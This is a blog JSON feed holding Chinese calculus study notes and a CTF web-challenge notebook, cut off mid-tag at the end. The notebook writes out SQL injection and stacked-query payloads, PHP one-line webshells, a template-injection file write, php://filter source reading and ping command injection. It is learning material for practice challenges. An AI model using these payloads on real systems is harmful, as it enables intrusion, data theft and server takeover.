{
    "version": "https://jsonfeed.org/version/1",
    "title": "Shoka",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/03/19/Mathematics/%E9%94%99%E9%A2%98%E6%9C%AC/",
            "url": "http://example.com/2023/03/19/Mathematics/%E9%94%99%E9%A2%98%E6%9C%AC/",
            "title": "错题本",
            "date_published": "2023-03-19T11:29:17.421Z",
            "content_html": "<h1 id=\"数学错题\"><a class=\"anchor\" href=\"#数学错题\">#</a> 数学错题</h1>\n<h2 id=\"高数\"><a class=\"anchor\" href=\"#高数\">#</a> 高数</h2>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/00_5-1663714277821.png\" alt=\"5\" /></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/00_6-1663714314009.png\" alt=\"6\" /></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/00_7-1663714323364.png\" alt=\"7\" /></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/00_8-1663714341842.png\" alt=\"8\" /></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/01_9-1663714386623.png\" alt=\"9\" /></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/01_10-1663714362855.png\" alt=\"10\" /></p>\n",
            "tags": [
                "Notes"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/Mathematics/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6(%E4%B8%8B)/",
            "url": "http://example.com/2023/03/19/Mathematics/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6(%E4%B8%8B)/",
            "title": "高等数学(下)",
            "date_published": "2023-03-19T11:29:17.421Z",
            "content_html": "<p>关于高等数学下册的一些笔记</p>\n<hr />\n<h4 id=\"向量的方向角和方向余弦\"><a class=\"anchor\" href=\"#向量的方向角和方向余弦\">#</a> 向量的方向角和方向余弦</h4>\n<p><img data-src=\"https://pic3.zhimg.com/80/v2-372cbaa699e447996d4c6d27ebbc4f2a_1440w.webp\" alt=\"向量的方向角和方向余弦\" /></p>\n<h4 id=\"向量叉乘\"><a class=\"anchor\" href=\"#向量叉乘\">#</a> 向量叉乘</h4>\n<blockquote>\n<p>在三维几何中，向量 a 和向量 b 的叉乘结果是一个向量，该向量垂直于 a 和 b 向量构成的平面，该向量也被称作法向量</p>\n</blockquote>\n<p><img data-src=\"https://sunocean.life/blog/assets/images/201205-3d-linear-algebra/20160902232814429.jpg\" alt=\"矢量叉乘 - 小时百科\" /></p>\n<p>右手螺旋定则，手指指向左元。</p>\n<h5 id=\"叉乘公式\"><a class=\"anchor\" href=\"#叉乘公式\">#</a> 叉乘公式</h5>\n<p><em>--- 行列式的展开</em></p>\n<p><img data-src=\"https://img-my.csdn.net/uploads/201704/19/1492585617_5108.png\" alt=\"img\" /></p>\n<p><img data-src=\"https://pics3.baidu.com/feed/38dbb6fd5266d0166e8615243bd8d80d34fa3518.png@f_auto?token=ebf017fb7eacd318da1313abf2fc6484\" alt=\"img\" /></p>\n<h4 id=\"平面方程\"><a class=\"anchor\" href=\"#平面方程\">#</a> 平面方程</h4>\n<p><em>表达式</em></p>\n<ul>\n<li>\n<p>截距式</p>\n<p><strong>x/a+y/b+z/c=1</strong> 它与三坐标轴的交点分别为<em> P (a, 0, 0), Q (0, b, 0), R (0, 0, c)</em></p>\n</li>\n<li>\n<p>点法式</p>\n<p><strong>A(x-x0)+B(y-y0)+C(z-z0)=0</strong> 法向量为<strong> n</strong>=(A,B,C)</p>\n</li>\n<li>\n<p>一般式</p>\n<p><strong>Ax+By+Cz+D=0</strong> 基本与点法式相同</p>\n</li>\n</ul>\n<blockquote>\n<p>可用平面上两条相交的直线的方向向量做点乘从而求出<em>平面法向量</em></p>\n</blockquote>\n<h4 id=\"空间直线\"><a class=\"anchor\" href=\"#空间直线\">#</a> 空间直线</h4>\n<h5 id=\"空间直线方程\"><a class=\"anchor\" href=\"#空间直线方程\">#</a> 空间直线方程</h5>\n<ul>\n<li>两平面联立</li>\n<li>对称式，由方向向量和直线上一点确定</li>\n<li>参数式 // 可由对称式导出</li>\n</ul>\n<p>&lt;u&gt; 详情戳<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc1MDk3Mi9hcnRpY2xlL2RldGFpbHMvMTIxMTcyNzkz\">链接</span> &lt;/u&gt;</p>\n<h4 id=\"空间曲面\"><a class=\"anchor\" href=\"#空间曲面\">#</a> 空间曲面</h4>\n<h5 id=\"切面\"><a class=\"anchor\" href=\"#切面\">#</a> 切面</h5>\n<p><img data-src=\"https://picx.zhimg.com/v2-1a3899e4a5ec22962d64505ccd86dd29_720w.jpg?source=d16d100b\" alt=\"img\" /></p>\n",
            "tags": [
                "Notes"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/",
            "url": "http://example.com/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/",
            "title": "CTFNote",
            "date_published": "2023-03-19T11:29:17.421Z",
            "content_html": "<h1 id=\"ctf题目笔记\"><a class=\"anchor\" href=\"#ctf题目笔记\">#</a> CTF 题目笔记</h1>\n<p>遇到不认识的先查，不要刻板印象或置之不理。要善于搜索资料。</p>\n<hr />\n<h3 id=\"1初识sql注入\"><a class=\"anchor\" href=\"#1初识sql注入\">#</a> 1. 初识 SQL 注入</h3>\n<ul>\n<li>\n<p>登录处使用 findadmin 方法</p>\n<ul>\n<li>\n<p>'or 1=1--</p>\n</li>\n<li>\n<p>在 SQL 语句中 username=’username‘ and password=’password‘</p>\n<p>变成了 username=’ ’ or 1=1--  ’ and password=’password‘</p>\n</li>\n</ul>\n<p>称为 SQL 注释</p>\n</li>\n<li>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/SQL%E6%B3%A8%E5%85%A5%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93.png\" alt=\"SQL\" /></p>\n<p>Cookie 注入、Post 注入、盲注</p>\n</li>\n</ul>\n<blockquote>\n<p>做了 cookie，直接进 cookie 的 php 页面然后抓 cookie.php 的包，</p>\n<p>然后在 reapter 里看回显。拿到 flag。</p>\n<p>还做了一道<strong> baby_web</strong>，直接根据提示进 index.php（这里主要是</p>\n<p>不知道 index 是什么（<strong>index.php 是首页</strong>））</p>\n<p>或者先抓个包，把 get 改成 index.php 然后 send，之后直接看 response 得到 flag。</p>\n<p>（其实都很简单主要是不会操作，基础太差）</p>\n<p>还有一道弱口令<strong> weak_auth</strong> 就是简单的弱口令（最开始想直接注入（练练手，学了好几天 SQL 注入了）结果要盲注，不会！只能查怎么爆破了）</p>\n<p>最后用 burpsuite 爆破账号:admin</p>\n<p>密码：123456</p>\n<p>就真没想到这么 weak！！</p>\n</blockquote>\n<h3 id=\"2get_post\"><a class=\"anchor\" href=\"#2get_post\">#</a> 2.get_post</h3>\n<p>可以通过 url 进行 get 操作，通过 hackbar 的 postpage 进行 post 操作</p>\n<p><img data-src=\"D:%5CPictures%5Cassets%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%5Cget_post.png\" alt=\"11\" /></p>\n<h3 id=\"3backup\"><a class=\"anchor\" href=\"#3backup\">#</a> 3.backup</h3>\n<p>注意源码泄露问题。</p>\n<p>可用脚本 dirsearch 进行目录扫描。</p>\n<h3 id=\"4warmup\"><a class=\"anchor\" href=\"#4warmup\">#</a> 4.warmup</h3>\n<p>代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">emmm</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token global\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token global\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token scope\">emmm<span class=\"token punctuation\">::</span></span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token global\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">include</span> <span class=\"token global\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://evefortosaber.github.io/Open-pictures/warmup.png\" alt=\"aa\" /></p>\n<h3 id=\"5相关一句马知识点\"><a class=\"anchor\" href=\"#5相关一句马知识点\">#</a> 5. 相关一句马 (知识点)</h3>\n<p><strong>&lt;?php eval($_REQUEST['key']);?&gt;</strong></p>\n<p><strong>&lt;?php system($_REQUEST['ab12']);?&gt;</strong></p>\n<p><strong>&lt;?php eval($_POST[123]);?&gt;</strong></p>\n<p>webshell 分别为：key，ab12,123</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>? a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>php</span><span class=\"token punctuation\">></span></span>file_put_contents('test.php','<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span>')<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>php</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://evefortosaber.github.io/Open-pictures/yijian.png\" alt=\"yijian\" /></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/yijjian1.png\" alt=\"yijian1\" /></p>\n<h3 id=\"6php伪协议\"><a class=\"anchor\" href=\"#6php伪协议\">#</a> 6.PHP 伪协议</h3>\n<p>需要开启 allow_url_fopen 的: php://stdin、php://memory、php://temp</p>\n<p>不需要开启 allow_wrl_fopen 的：php://filter</p>\n<p>在 CTF 中常用的 php://filter</p>\n<p>php://filter 用于读取源码，php://input 用于执行 php 代码<br />\n php://input 需要 post 提交数据<br />\n php://filter 可以提交？a=php://filter/read=convert.base64-encode/resource=xxx.php</p>\n<p>url 中？代表传值的意思，id 代表变量，后面的 &quot;=&quot; 代表变量的值</p>\n<h3 id=\"7suctf-2019easysql\"><a class=\"anchor\" href=\"#7suctf-2019easysql\">#</a> 7.[SUCTF 2019]EasySQL</h3>\n<p>一道 sql 注入的题目，题目原意是堆叠注入或该换 || 的用处。然而 wp 中却给出了一种短路处理的办法。</p>\n<p>我们来细究一下它的原理。</p>\n<hr />\n<h4 id=\"直接注\"><a class=\"anchor\" href=\"#直接注\">#</a> 直接注</h4>\n<p>首先吗看题</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/easysql1.jpg\" alt=\"easysql1\" /></p>\n<p>然后寻找注入点，先试试 <code>',&quot;,'),&quot;)</code></p>\n<p>然后回显不是 “无” 就是 Nonono.</p>\n<p>在用字符，和整数试试。发现字符时无回显，整数时有！！</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/easysql2.jpg\" alt=\"easysql2\" /></p>\n<p>这是一个表结构！！</p>\n<p>再审题，发现他说” 查询 “？怀疑这是个内嵌的后端查询，就是说它的<strong>源码</strong>可能是</p>\n<p><code> select $_POST['query'] from xxx</code></p>\n<p>越来越靠近真相了！！</p>\n<p>所以它应该是对 <code>',&quot;,'),&quot;)</code>  报错了所以什么都不回显或者是过滤，再试试 database () 发现没有用？？</p>\n<p>上面能回显整数却不回显字符 (a,b,c...)，em... 有问题。</p>\n<p>回想上一张输入整数的图，他回显了个 <code>Array ( [0] =&gt; 1 )</code> ,en... 它从 xxx 这个表中返回了 1 条数据，说明这个数据表 xxx 中只有一条数据，si~~。</p>\n<p>继续，结合题目</p>\n<blockquote>\n<p>Give me your flag, I will tell you if the flag is right.</p>\n</blockquote>\n<p>flag？is right？  很可能这条数据就是 flag！！！</p>\n<p>说明这个源码查询的就是 flag！但查不出来为什么？再思考。</p>\n<blockquote>\n<p><code> select 1 from xxx</code>  得到的结果就是，一堆 1，1 的数量与数据数量有关。</p>\n</blockquote>\n<p>又题目输入整数时它都得到 1，所以可能这里有个<strong>或结构</strong>，</p>\n<p>所以在 $_POST ['query'] 这块肯定有玄机，2 xxx =&gt; 1??</p>\n<p>难道是 || 语法？试试 0. 0 的话查不出来.</p>\n<p>再回想源码，（<em><strong>结合上面的分析，不妨把表记作 Flag，表中字段为 fffff，字段内容为我们要的 flag）</strong></em></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'query'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">from</span> Flag</pre></td></tr></table></figure><p>所以应该是，</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'query'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span>flag <span class=\"token keyword\">from</span> Flag</pre></td></tr></table></figure><p>flag 本身是假的，不然早注成了！！</p>\n<p>所以直接构造 <code> *,1</code>  (联系到 select 查询多个的语法)</p>\n<p>然后破案了。</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/easysql_end.jpg\" alt=\"easysql_end\" /></p>\n<hr />\n<h4 id=\"另一种姿势\"><a class=\"anchor\" href=\"#另一种姿势\">#</a> 另一种姿势</h4>\n<p>先上 payload:</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">set</span> sql_mode<span class=\"token operator\">=</span>pipes_as_concat<span class=\"token punctuation\">;</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span></pre></td></tr></table></figure><p>(前面一个 1 隔断前置 select 后面一个 1？)<br />\n 你直接看这英语意思：</p>\n<p>pipes_as_concat</p>\n<p><strong>就是把 || 设置成了 concat 函数呗。。。</strong><br />\n这也是<strong>猜出了后端代码</strong>的。</p>\n<p>但是要注意 &lt;u&gt; 分号隔断了前面的命令 &lt;/u&gt;(堆叠注入)，所以要再次添加 select!!</p>\n<p>上面那句执行是：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>flag<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> Flag</pre></td></tr></table></figure><p>搞定。</p>\n<h3 id=\"8easy_sql\"><a class=\"anchor\" href=\"#8easy_sql\">#</a> 8.Easy_sql</h3>\n<p>有报错但发现 union select 被过滤了，</p>\n<p>where 也被过滤了，但可以堆叠。</p>\n<p>所以使用了 show tables 查表，show columns from ’table‘ 查字段</p>\n<p>找到了 flag 字段，问题在于如何查询 flag？这里给出了两种解法。</p>\n<blockquote>\n<p>当我们输入 1 时回显数据，并发现当输入 ' 时报错，联系题目提示的查询，这里的源代码应该时和 select 有关。</p>\n</blockquote>\n<ol>\n<li>\n<p>使用更改表名和字段名的方法使其默认查询的表字段变为 flag 的。</p>\n<p>payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span>'<span class=\"token punctuation\">;</span><span class=\"token keyword\">rename</span> <span class=\"token keyword\">tables</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">to</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words1<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span><span class=\"token keyword\">rename</span> <span class=\"token keyword\">tables</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">to</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span> change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>flag<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span></pre></td></tr></table></figure><p>使用了 rename，和 alter，进行修改。</p>\n</li>\n<li>\n<p>用 mysql 所支持的另一种查询语句。</p>\n<p>payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span>'<span class=\"token punctuation\">;</span><span class=\"token keyword\">handler</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">open</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">handler</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">read</span> <span class=\"token keyword\">first</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span></pre></td></tr></table></figure></li>\n</ol>\n<blockquote>\n<p>这里需要注意，在之前是先验证了它有回显，有报错，有堆叠！！</p>\n</blockquote>\n<p>相关资料： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0plc3NlWW91bmcvYXJ0aWNsZS9kZXRhaWxzLzQwNzg1MTM3P2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLUJsb2dDb21tZW5kRnJvbUJhaWR1LTEmYW1wO3V0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy1CbG9nQ29tbWVuZEZyb21CYWlkdS0x\">handler 语法</span></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/easy_sql.jpg\" alt=\"easy_sql\" /></p>\n<h3 id=\"9actf2020-新生赛exec\"><a class=\"anchor\" href=\"#9actf2020-新生赛exec\">#</a> 9.[ACTF2020 新生赛] Exec</h3>\n<p>本题是一道 Linux 命令题。</p>\n<p>注：ping 本身是一种命令行为。</p>\n<p>通过分号断开。</p>\n<p>payload 为</p>\n<pre><code>127.0.0.1;ls\n</code></pre>\n<p>试探是否能命令语句注入。</p>\n<p>结果可以。</p>\n<pre><code>127.0.0.1;ls /;\n</code></pre>\n<p>遍历目录下的文件。发现 flag 文件。</p>\n<pre><code>127.0.0.1;cat /flag;\n</code></pre>\n<p>得到 flag。</p>\n<h3 id=\"10gxyctf2019ping-ping-ping\"><a class=\"anchor\" href=\"#10gxyctf2019ping-ping-ping\">#</a> 10.[GXYCTF2019]Ping Ping Ping</h3>\n<p><code>$IFS$1</code> , <code> %09</code></p>\n<p>为什么用内联执行</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1</span><span class=\"token string backtick-quoted-string\">`ls`</span></pre></td></tr></table></figure><p><span class=\"exturl\" 